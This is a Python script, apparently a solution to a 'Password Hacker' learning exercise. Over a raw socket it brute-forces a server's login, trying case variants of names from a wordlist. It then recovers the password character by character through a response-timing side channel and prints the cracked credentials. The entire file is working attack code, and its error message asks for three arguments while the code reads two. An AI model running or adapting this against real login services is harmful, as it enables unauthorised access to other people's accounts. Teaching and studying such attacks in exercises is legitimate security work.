import itertools
import socket
import string
import sys
import json
import time

logins_file = '..Password Hacker\\task\\hacking\\logins.txt'
characters = string.ascii_letters + string.digits

try:
    address, address_port = sys.argv[1:]
except IndexError:
    print("Error: You should specify 3 space separated arguments. ")


def send_msg_via_socket(sck, **data):
    payload = json.dumps(data).encode()
    sck.send(payload)
    start = time.perf_counter()
    response = sck.recv(1024).decode()
    end = time.perf_counter()
    delay = end - start
    return json.loads(response), delay


def credentials_generator(file_path):
    with open(file_path, 'r') as file:
        for line in file.readlines():
            credential = line.strip()
            for _ in itertools.product(*((letter.lower(), letter.upper()) for letter in credential)):
                yield ''.join(_)


def find_login_value(values):
    msg = {"result": ""}
    while msg["result"] != "Wrong password!":
        login = next(values)
        msg, delay = send_msg_via_socket(client_socket, login=login, password="")
    return login


def find_password_value(password):
    for character in characters:
        key = password + character
        msg, delay = send_msg_via_socket(client_socket, login=login, password=key)
        if msg["result"] == "Connection success!":
            return key
        elif delay > 0.09:
            return find_password_value(key)


with socket.socket() as client_socket:
    client_socket.connect((address, int(address_port)))

    # Find valid login first
    logins_generator = credentials_generator(logins_file)
    login = find_login_value(logins_generator)

    # Successfully connect
    password = find_password_value("")

    # Output result
    result = json.dumps({"login": login, "password": password})
    print(result)
